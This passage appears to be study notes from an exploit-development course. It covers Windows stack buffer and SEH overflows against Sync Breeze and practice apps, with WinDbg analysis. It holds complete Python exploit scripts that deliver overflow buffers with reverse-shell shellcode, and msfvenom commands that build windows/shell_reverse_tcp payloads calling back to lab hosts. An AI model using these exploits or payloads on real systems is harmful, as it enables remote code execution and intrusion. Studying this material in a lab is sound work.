
This eventually mangles several bytes close to the address pointed at by the ESP register.

The decoder starts exactly at the address pointed to by the ESP register.

=> The GetPC routine execution ends up changing a few bytes of the decoder itself, and potentially the encoded shellcode. 

=> Cause the decoding process to fail and crash the target process.

To avoid this issue, 2 ways:

- Adjust ESP backwards, making use of assembly instructions such as `DEC ESP`, `SUB ESP, 0xXX` before executing the decoder.

- Precede our payload with a series of No Operation (`NOP`) instructions, which have an opcode value of `0x90` aka **NOP sled** or **NOP slide**, will let the CPU "slide" through the NOPs until the payload is reached.

By the time the execution reaches the shellcode decoder, the stack pointer is far enough away not to corrupt the shellcode when the GetPC routine overwrites a few bytes on the stack.

```bash
sudo nc -lvp 443
```

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  nops = b"\x90" * 10
  shellcode= b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff..."
  shellcode+= b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode))
  inputBuffer = filler + eip + offset + nops + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

## Improving the Exploit

The default `exit` method of a Metasploit shellcode is the **ExitProcess** API - will shut down the whole web service process when the reverse shell is terminated, effectively killing the Sync Breeze service and causing it to crash.

If the program we are exploiting is a **threaded application**, use the **ExitThread** API to only terminate the affected thread of the program.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Replace regex `"\n"` with blank in VS Code

## Extra Mile

### VulnApp1

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 7001
  size = 800

  filler = b"A" * 2288
  eip = b"\xcf\x10\x80\x14" # 148010cf
  offset = b"C" * 8
  nops = b"\x90" * 10
  # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.156 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00"
  shellcode = b"\xbb\x49\x96\xa8\xee\xd9\xec\xd9\x74\..."
  # shellcode+= b"D" * (2560 - len(filler) - len(eip) - len(offset) - len(nops) - len(shellcode))
    
  print("Sending evil buffer...")
  
  buffer = filler + eip + offset + nops + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except:
  print("Could not connect!")
```

### VulnApp2

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 7002

  nops = b"\x90" * 10
  # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.156 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x3b\x45"
  shellcode = b"\xbb\xda\xe4\xc8\x5b\xda\xdc\xd9\x74\x24\xf4\..."
  filler = b"A" * (2080 - len(nops) - len(shellcode))
  eip = b"\x11\x2e\x80\x14" # call ecx - 14802e11
  jumpcode = b"C" * 12
  buffer = nops + shellcode + filler + eip + jumpcode
    
  print("Sending evil buffer...")
  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except:
  print("Could not connect!")
```

# Exploiting SEH Overflows

`python3 seh_overflow_0x01.py 192.168.120.10`

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * size

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

The `EAX` register was overwritten by our "A" buffer. Attempting to execute the `call dword ptr [eax+24h]` instruction triggers an access violation.

The debugger intercepted a 1st chance exception, which is a notification that an unexpected event occurred during the program's normal execution.

Let the application go with `g`, we gained control over the instruction pointer (`eip=41414141`)

## Structured Exception Handling

**Exceptions** are unexpected events that occur during normal program execution.

2 kinds of exceptions:

- **Hardware** exceptions are initiated by the CPU. E.g. When our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address.

- **Software** exceptions are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. E.g., A software developer might want to raise an exception in their code to signal that a function could not execute normally because of an invalid input argument.

Define an exception construct through a `_try/_except` code block.

When compiled, the `_try/_except` code will leverage the Structure Exception Handling (SEH) mechanism implemented by the Windows OS to handle unexpected events.

When a thread faults, the OS calls a designated set of functions (aka **exception handlers**), which can correct, or provide more information about, the unexpected condition.

The exception handlers are **user-defined** and are created during the compilation of the `_except` code blocks.

The **default exception handler** is a special case in that it is **defined by the OS** itself.

The OS must be able to locate the correct exception handler when an unexpected event is encountered.

Structured exception handling works on a **per-thread level**.

Each thread in a program can be identified by the **Thread Environmental Block (TEB)** structure.

Every time a try block is encountered during the execution of a function in a thread, a pointer to the corresponding exception handler is saved on the stack within the `_EXCEPTION_REGISTRATION_RECORD` structure.

Since there may be several try blocks executed in a function, these structures are connected together in a **linked list**.

![SEH Mechanism in action](Images\SEH_mechanism.png)
 
When an exception occurs, the OS inspects the TEB structure of the faulting thread and retrieves a pointer (`ExceptionList`) to the linked list of `_EXCEPTION_REGISTRATION_RECORD` structures through the FS CPU register.

The CPU can access the TEB structure at any given time using the FS segment register at offset zero (`fs:[0]`) on the x86 architecture.

After retrieving the `ExceptionList`, the OS will begin to walk it and invoke every exception handler function until one is able to deal with the unexpected event.

If none of the user-defined functions can handle the exception, the OS invokes the **default exception handler**, which is always the **last node in the linked list**.

This is a special exception handler that terminates the current process or thread in case the application is a **system service**.

### Key Exception Handling Structures

Dump the TEB structure:

`dt nt!_TEB`

The `nt!_TEB` structure starts with a nested structure called `_NT_TIB`.

Dumping `_NT_TIB` shows the 1st member in this structure is a pointer named `ExceptionList`, which points to the first `_EXCEPTION_REGISTRATION_RECORD` structure.

`dt _NT_TIB`

The `_EXCEPTION_REGISTRATION_RECORD` structure contains 2 members:

- `Next`, which points to a `_EXCEPTION_REGISTRATION_RECORD` structure

- `Handler`, which points to an `_EXCEPTION_DISPOSITION` structure.

`dt _EXCEPTION_REGISTRATION_RECORD`

The `Next` member acts as a link between `_EXCEPTION_REGISTRATION_RECORD` structures in the singly-linked list of registered exception handlers.

The `Handler` member is a pointer to the exception callback function named `_except_handler`, which returns an `_EXCEPTION_DISPOSITION` structure on Windows 10 x86.

The `_except_handler` function prototype:

```C
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,  
    IN OUT PCONTEXT ContextRecord,  
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
); 
```

Inside a debugger, the function can have different name variations, such as `ntdll!_except_handler4`. These naming differences are introduced by the symbols provided by Microsoft for each version of Windows.

- `EstablisherFrame` points to the `_EXCEPTION_REGISTRATION_RECORD` structure, which is used to handle the exception.

- `ContextRecord` is a pointer to a `CONTEXT` structure, which contains processor-specific register data at the time the exception was raised.

Dump the `CONTEXT` structure

`dt ntdll!_CONTEXT`

This structure stores the state of all our registers, including the instruction pointer (EIP). => used to **restore the execution flow after handling the exception**.

`_EXCEPTION_DISPOSITION` structure contains the result of the exception handling process.

`dt _EXCEPTION_DISPOSITION`

- If the exception handler invoked by the OS is not valid for dealing with a specific exception, it will return `ExceptionContinueSearch`. This result instructs the OS to move on to the next `_EXCEPTION_REGISTRATION_RECORD` structure in the linked list.

- If the function handler can successfully handle the exception, it will return `ExceptionContinueExecution`, which instructs the system to resume execution.

How the OS calls the exception handler functions and what checks are performed before invoking them.

### SEH Validation

When an exception is encountered, `ntdll!KiUserExceptionDispatcher` is called. This function is responsible for dispatching exceptions on Windows OS.

The function takes 2 arguments.

1. An `_EXCEPTION_RECORD` structure that contains information about the exception.

2. A `CONTEXT` structure.

Eventually, this function calls into `RtlDispatchException`, which will retrieve the **TEB** and proceed to parse the `ExceptionList` through the mechanism explained.

During this process, for each `Handler` member in the singly-linked `ExceptionList` list, the OS will ensure that the `_EXCEPTION_REGISTRATION_RECORD` structure falls within the **stack memory limits** found in the TEB.

During the execution of `RtlDispatchException`, the OS performs additional checks by invoking the `RtlIsValidHandler` function for every exception handler.

`RtlIsValidHandler` is responsible for the **SafeSEH** implementation - a mitigation to prevent an attacker from gaining control of the execution flow after overwriting a stack-based exception handler.

If a module is compiled with the **SafeSEH** flag, the linker will produce an image containing a table of safe exception handlers.

A **linker** is a computer program that combines object files generated by a compiler or assembler into a single executable or library file. It can even combine object files into another object file.

The OS will then validate the exception_handler on the stack by comparing it to the entries in the table of safe exception handlers. If the handler is not found, the system will refuse to execute it.

Pseudo-code for the `RtlIsValidHandler` function

```C
BOOL RtlIsValidHandler(Handler) // NT 6.3.9600
  {
        if (/* Handler within the image */) {
            if (DllCharacteristics->IMAGE_DLLCHARACTERISTICS_NO_SEH)
                goto InvalidHandler;
            if (/* The image is .Net assembly, 'ILonly' flag is enabled */)
                goto InvalidHandler;
            if (/* Found 'SafeSEH' table */) {
                if (/* The image is registered in 'LdrpInvertedFunctionTable' (or its cache), or the initialization of the process is not complete */) {
                    if (/* Handler found in 'SafeSEH' table */)
                        return TRUE;
                    else
                        goto InvalidHandler;
                }
            return TRUE;
        } else {
            if (/* 'ExecuteDispatchEnable' and 'ImageDispatchEnable' flags are enabled in 'ExecuteOptions' of the process */)
                return TRUE;
            if (/* Handler is in non-executable area of the memory */) {
                if (ExecuteDispatchEnable) return TRUE;
            }
            else if (ImageDispatchEnable) return TRUE;
        }
        InvalidHandler:
            RtlInvalidHandlerDetected(...);
            return FALSE;
  }
```

The `RtlIsValidHandler` function checks the `DllCharacteristics` of the specific **module** where the exception occurs.

If the module is compiled with **SafeSEH**, the `exception_handler` will be compared to the entries in the table of safe exception handlers before it is executed.

If `RtlIsValidHandler` succeeds with its validation steps, the OS will call the `RtlpExecuteHandlerForException` function. This function is responsible for setting up the appropriate arguments and invoking `ExecuteHandler`. This native API is responsible for calling the `_except_handler` functions registered on the stack.

SafeSEH requires applications to be compiled with the `/SAFESEH` flag Microsoft introduced an additional mitigation named **Structured Exception Handler Overwrite Protection (SEHOP)**.

**SEHOP** works by verifying that the chain of `_EXCEPTION_REGISTRATION_RECORD` structures are valid before invoking them.

Because the `Next` member is overwritten as part of a SEH overflow the chain of `_EXCEPTION_REGISTRATION_RECORD` structures is no longer intact and the SEHOP mitigation will prevent the corrupted `_except_handler` from executing.

SEHOP is disabled by default on Windows client editions and enabled by default on server editions.

Whenever an exception occurs, the OS calls a designated set of functions as part of the SEH mechanism. Within these function calls, the `ExceptionList` single-linked list is gathered from the TEB structure.

Next, the OS parses the singly-linked list of `_EXCEPTION_REGISTRATION_RECORD` structures, performing various checks before calling the `exception_handler` function pointed to by each `Handler` member. This continues until a handler is found that will successfully process the exception and allow execution to continue. If no handler can successfully handle the exception, the application will crash.

## Structured Exception Handler Overflows

A structure exception overflow is a stack buffer overflow that is either large enough or positioned in such a way to overwrite valid registered exception handlers on the stack.

By overwriting one or more of these handlers, the attacker can take control of the instruction pointer after triggering an exception.

In most cases, an overflow tends to overwrite valid pointers and structures on the stack, which often generates an access violation exception.

If this does not occur, an attacker can often force an exception by increasing the size of the overflow.

**SEH Overflows can bypass Stack Cookies**

Stack overflow mitigation named `GS` is enabled by default in modern versions of Visual Studio.

When a binary that is compiled with the `/GS` flag is loaded a **random stack cookie seed** value is initialized and stored in the `.data` section of the binary.

When a **function** protected by GS is called, an **XOR operation** takes place between the stack cookie seed value and the EBP register. The result of this operation is stored on the stack prior to the return address.

Before returning out of the protected function, another XOR operation occurs between the previous value saved on the stack and the EBP register. This result is then checked with the stack cookie seed value from the `.data` section. If the values do not match the application will throw an exception and terminate the execution.

Overwriting an exception handler and causing the application to crash in any way triggers the SEH mechanism and causes the instruction pointer to be redirected to the address of the `exception_handler` prior to reaching the end of the vulnerable function.

=> Overwriting a `_EXCEPTION_REGISTRATION_RECORD` can allow an attacker to **bypass stack cookies**.

The `_EXCEPTION_REGISTRATION_RECORD` structures are stored at the beginning of the stack space.

### Inspect a chain of `_EXCEPTION_REGISTRATION_RECORD` structures

Because the SEH mechanism works on a per-thread basis, we won't be able to inspect the intact SEH chain for the thread handling our incoming data, as that thread has not yet spawned.

Instead, we will inspect the chain of `_EXCEPTION_REGISTRATION_RECORD` structures for the thread WinDbg breaks into when we attach the debugger to the target process.

Obtain the TEB address which will contain the `ExceptionList` pointer:

`!teb`

The `ExceptionList` starts very close to the beginning of the `StackBase`.

Dump the first `_EXCEPTION_REGISTRATION_RECORD` structure at the memory address specified in the `ExceptionList` member.

The `_EXCEPTION_REGISTRATION_RECORD` structure has 2 members:

- `Next` points to the next entry in the singly-linked list.
- `Handler` is the memory address of the `_except_handler` function.

```
dt _EXCEPTION_REGISTRATION_RECORD 0132ff70
dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffcc
dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffe4
```

The end of the singly-linked list is marked by the `0xffffffff` value stored by the last `_EXCEPTION_REGISTRATION_RECORD` `Next` member. This last record is the default exception handler specified by the OS.

### Back to the PoC

Send our previous PoC, once again triggering an access violation:

```bash
python3 seh_overflow_0x01.py 192.168.120.10
```

Attempt to walk the `ExceptionList` => The **second** `_EXCEPTION_REGISTRATION_RECORD` structure has been overwritten by our malicious buffer.

```
!teb
dt _EXCEPTION_REGISTRATION_RECORD 01c4fe1c
dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54
```

### Important Note

`_EXCEPTION_REGISTRATION_RECORD` structures are pushed on the stack from first to last.

=> SEH overflows generally overwrite the last `_EXCEPTION_REGISTRATION_RECORD` structure first.

Depending on the length of the overflow, it is possible to overwrite more than one `_EXCEPTION_REGISTRATION_RECORD` structure.

The exception occurs because the application is trying to read and execute from an unmapped memory page.

=> An **access violation exception** that needs to be handled by either the application or the OS.

List the current thread exception handler chain:

`!exchain`

```
01c4fe1c: libpal!md5_starts+149fb (00b3df5b)
01c4ff54: 41414141
Invalid exception stack at 41414141
```

The 1st step in the SEH mechanism is to obtain the address of the first `_EXCEPTION_REGISTRATION_RECORD` structure from the TEB.

The OS then proceeds to call each `_except_handler` function until the exception is properly handled, or it simply crashes the process if no handler could successfully deal with the exception.

At this point, the address of at least one of the `_except_handler` functions has been overwritten by our buffer (`0x41414141`).

=> Whenever this `_EXCEPTION_REGISTRATION_RECORD` structure is used to handle the exception, the CPU will end up calling `0x41414141`, giving us control over the EIP register.

Resuming execution and letting the application attempt to handle the exception with `g`.

Inspect the **callstack** to determine which functions were called before the EIP register was overwritten

`k`

```
 # ChildEBP RetAddr  
00 01c4f434 77383b02 0x41414141
01 01c4f458 77383ad4 ntdll!ExecuteHandler2+0x26
02 01c4f528 77371586 ntdll!ExecuteHandler+0x24
03 01c4f528 00ac2a9d ntdll!KiUserExceptionDispatcher+0x26
04 01c4fec8 00000000 libpal!SCA_ConfigObj::Deserialize+0x1d
```

`ntdll!ExecuteHandler2` was called directly before we achieved code execution. This function is responsible for calling the `_except_handler` functions registered on the stack.

List all the registers to determine if any of them point to our buffer:

`r`

The ECX register is being overwritten alongside the instruction pointer while most of the other registers are NULL.

`u edx`

EDX appears to point somewhere inside the `ntdll!ExecuteHandler2` function.

=> None of the registers point to our buffer at the moment we gain control over the execution.

`dds esp La`

We do not overwrite any data on the stack (which ESP and EBP point to).

Set a breakpoint at the `ntdll!ExecuteHandler2` function to stop the execution before WinDbg intercepts the exception (after the  1st chance exception)

`bp ntdll!ExecuteHandler2`

When the access violation is triggered, the 1st entry in `ExceptionList` is not overwritten by our buffer.

Our overflow only affects the following `_EXCEPTION_REGISTRATION_RECORD` structure in the linked list.

=> When the SEH mechanism tries to handle the exception, `ntdll!ExecuteHandler2` will be called twice.

Initially, it will use the first `_EXCEPTION_REGISTRATION_RECORD` structure (which is still intact) and then proceed to use the corrupted structure.

When the breakpoint is first triggered, let execution resume twice with `g`.

After hitting our breakpoint the 2nd time, inspect the assembly code of the executing function:

`u @eip L11`

```
ntdll!ExecuteHandler2:
55              push    ebp
8bec            mov     ebp,esp
ff750c          push    dword ptr [ebp+0Ch]
52              push    edx
64ff3500000000  push    dword ptr fs:[0]
64892500000000  mov     dword ptr fs:[0],esp
ff7514          push    dword ptr [ebp+14h]
ff7510          push    dword ptr [ebp+10h]
ff750c          push    dword ptr [ebp+0Ch]
ff7508          push    dword ptr [ebp+8]
8b4d18          mov     ecx,dword ptr [ebp+18h]
ffd1            call    ecx
648b2500000000  mov     esp,dword ptr fs:[0]
648f0500000000  pop     dword ptr fs:[0]
8be5            mov     esp,ebp
5d              pop     ebp
c21400          ret     14h
```

According to the call stack, `call ecx` should call the overwritten `_except_handler` function (`0x41414141`).

This function accepts 4 arguments as inferred from the 4 PUSH instructions preceding the `call ecx`.

This matches the `_except_handler` function prototype:

```C
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,
    IN OUT PCONTEXT ContextRecord, 
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
); 
```

We start by saving the EBP register on the stack and moving the stack pointer to EBP to easily access the arguments passed to the `ntdll!ExecuteHandler2` function (running `t` twice).

`ff750c   push dword ptr [ebp+0Ch]  ss:0023:018ef464=018eff54`

`!teb`

```
TEB at 003c4000
    ExceptionList:        018efe1c
    StackBase:            018f0000
    StackLimit:           018ee000
```

`dt _EXCEPTION_REGISTRATION_RECORD 018efe1c`

```
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next         : 0x018eff54   _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler      : 0x0097df5b   _EXCEPTION_DISPOSITION  libpal!md5_starts+0
```

The first PUSH instruction push the `Next` member of the first `_EXCEPTION_REGISTRATION_RECORD` structure on the stack.

```
t
u @edx
```

```
ntdll!ExecuteHandler2+0x44:
77383b20 8b4c2404        mov     ecx,dword ptr [esp+4]
77383b24 f7410406000000  test    dword ptr [ecx+4],6
77383b2b b801000000      mov     eax,1
77383b30 7512            jne     ntdll!ExecuteHandler2+0x68 (77383b44)
77383b32 8b4c2408        mov     ecx,dword ptr [esp+8]
77383b36 8b542410        mov     edx,dword ptr [esp+10h]
77383b3a 8b4108          mov     eax,dword ptr [ecx+8]
77383b3d 8902            mov     dword ptr [edx],eax
```

`push edx` appears to place an offset into the `ntdll!ExecuteHandler2` function on the stack.

`t`

```
64ff3500000000  push dword ptr fs:[0]  fs:003b:00000000=018efe1c
```

`!teb`

```
TEB at 003c4000
    ExceptionList:        018efe1c
    StackBase:            018f0000
    StackLimit:           018ee000
```

The 3rd PUSH instruction push the current thread `ExceptionList` onto the stack.

`t`

This is followed by a `mov dword ptr fs:[0],esp` instruction, which will overwrite the current thread `ExceptionList` with the value of ESP.

`!teb`

```
TEB at 003c4000
    ExceptionList:        018efe1c
    StackBase:            018f0000
    StackLimit:           018ee000
```

`t`

```
ff7514   push dword ptr [ebp+14h]  ss:0023:018ef46c=018ef4cc
```

`!teb`

```
TEB at 003c4000
    ExceptionList:        018ef44c
    StackBase:            018f0000
    StackLimit:           018ee000
```

`dt _EXCEPTION_REGISTRATION_RECORD 018ef44c`

```
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x018efe1c _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x770a3b20   _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+0
```

Before pushing the parameters required for the `_except_handler` function and calling it, the OS updates `ExceptionList` with a new `_EXCEPTION_REGISTRATION_RECORD` structure.

This new `_EXCEPTION_REGISTRATION_RECORD` is responsible for handling exceptions that might occur during the call to `_except_handler`.

The function used to handle these exceptions is placed in EDX  before the call to `ntdll!ExecuteHandler2`.

The OS leverages various exception handlers depending on the function that is used to invoke the `_except_handler`.

In our case, the handler located at `0x770a3b20` is used to deal with exceptions that might occur during the execution of `RtlpExecuteHandlerForException`.

After the execution of `_except_handler` ("call ecx"), the OS restores the original `ExceptionList` by removing the previously added `_EXCEPTION_REGISTRATION_RECORD`. This is done by executing the two instructions `mov esp,dword ptr fs:[0]` and `pop dword ptr fs:[0]`.

Proceed to single-step the remaining instructions with `t` and stop at `call ecx` to inspect the address we are about to redirect the execution flow to.

### Gaining Code Execution

`r`

```
eax=00000000 ebx=00000000 ecx=41414141 edx=77f16b30 esi=00000000 edi=00000000
eip=77f16b10 esp=013ff33c ebp=013ff358 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2+0x24:
77f16b10 ffd1            call    ecx {41414141}
```

`dds esp L6`

```
013ff33c  013ff440
013ff340  013fff54
013ff344  013ff45c
013ff348  013ff3cc
013ff34c  013ffe1c
013ff350  77f16b30 ntdll!ExecuteHandler2+0x44
```

The moment our fake handler function is called, the stack will contain the return address followed by the four _except_handler arguments.

```c
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,
    IN OUT PCONTEXT ContextRecord, 
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
);
```

The 2nd argument (EstablisherFrame) is a pointer to the `_EXCEPTION_REGISTRATION_RECORD` structure used to handle the exception.

`dt _EXCEPTION_REGISTRATION_RECORD 013fff54`

```
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
```
   
`dd 013fff54`

```
013fff54  41414141 41414141 41414141 41414141
013fff64  41414141 41414141 41414141 41414141
013fff74  41414141 41414141 41414141 41414141
013fff84  41414141 41414141 41414141 41414141
013fff94  41414141 41414141 41414141 41414141
013fffa4  41414141 41414141 41414141 41414141
013fffb4  41414141 41414141 41414141 41414141
013fffc4  41414141 41414141 41414141 41414141
```

The 2nd argument (`EstablisherFrame`) passed to the handler function points to our controlled data on the stack, i.e. the same buffer that overwrites the `_EXCEPTION_REGISTRATION_RECORD` structure.

=> To redirect the execution flow to our buffer, we could overwrite the exception handler with the address of an instruction that returns into the `EstablisherFrame` address on the stack.

The most common sequence of instructions used in SEH overflows is `POP R32, POP R32, RET`.

In which we `POP` the **return address** and the `ExceptionRecord` argument from the stack into 2 arbitrary registers (R32) and then execute a `RET` operation to return into the `EstablisherFrame`.

Before searching for a `POP, POP, RET` (P/P/R) instruction sequence,determine the exact offset required to precisely overwrite the exception handler on the stack.

Generate a unique pattern with a length of 1000 bytes. This matches the input buffer size from our initial PoC that triggered the crash


```bash
msf-pattern_create -l 1000
```

```python
...
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8...Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
...
```


`!exchain`

```
0155fe1c: libpal!md5_starts+149fb (005fdf5b)
0155ff54: 33654132
Invalid exception stack at 65413165
```


```bash
msf-pattern_offset -l 1000 -q 33654132
```

```
[*] Exact match at offset 128
```


```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```

`!exchain`

```
013afe1c: libpal!md5_starts+149fb (005fdf5b)
013aff54: 42424242
Invalid exception stack at 41414141
```

### Detecting Bad Characters

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= badchars
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```

`dds esp L5`

```
0132f338  77f16b12 ntdll!ExecuteHandler2+0x26
0132f33c  0132f440
0132f340  0132ff54
0132f344  0132f45c
0132f348  0132f3cc
```

`db 0132ff54`

```
0132ff54  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 5b 00
0132ff64  10 3e 5b 00 28 73 a0 00-72 40 5b 00 58 cf 9f 00
```

Our buffer was truncated right after the 0x01 character => `0x02` is a bad character for our exploit.

After repeating this process several times we locate all the bad characters: `0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD`

### Finding a P/P/R Instruction Sequence

WinDbg narly extension generates a list of all loaded modules and their respective protections. The extension is already installed on our dedicated Windows client.

`.load narly`

Executing `!nmod` outputs a list of all loaded modules and their memory protections

`!nmod`

```
00400000 00463000 syncbrs              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
10000000 10226000 libspp               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
6cc70000 6cd09000 ODBC32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ODBC32.dll
...
*DEP/*ASLR means that these modules are compatible with ASLR/DEP
```

`/SafeSEH OFF` indicates that this application and its modules are compiled without SafeSEH. Since DEP and ASLR are not displayed, they are also disabled.

The most common way to bypass the SafeSEH protection is to leverage the `POP R32, POP R32, RET` instruction sequence from a module that was compiled without the `/SAFESEH` flag.

To make our exploit as reliable and portable4 as possible against multiple Windows OS, try to find a `POP R32, POP R32, RET` instruction sequence located inside a module that is part of the vulnerable software.

This ensures that it will be present on every installation of the software (regardless of Windows version).

The `libspp.dll` application DLL is a perfect candidate. It is compiled without any protections and is loaded in a memory range which does not contain null bytes.

Write a small script to search for a `P/P/R` instruction sequence.

2 common approaches to writing WinDbg scripts:

1. classic scripts: are normal WinDbg commands wrapped with a few control flow commands. They use pseudo-registers and don't have variables.

2. `pykd`, a powerful WinDbg Python wrapper

The new version of **WinDbg Preview** comes with a built-in JavaScript scripting engine (not be covered in this course).

Determine the specific opcodes and the address range we'll search.

We could also leverage `mona.py` for this but as of this writing, it does not work with Python 3, which is provided on the dedicated Windows client.

Since we are going to search through `libspp.dll`, retrieve the start and end memory addresses with WinDbg:

`lm m libspp`

```
Browse full module list
start    end        module name
10000000 10226000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
```

```bash
msf-nasm_shell
nasm > pop eax
nasm > pop ebx
nasm > pop ecx
nasm > pop edx
nasm > pop esi
nasm > pop edi
nasm > pop ebp
nasm > ret
```

`$><C:\Users\offsec\Desktop\find_ppr.wds`

```
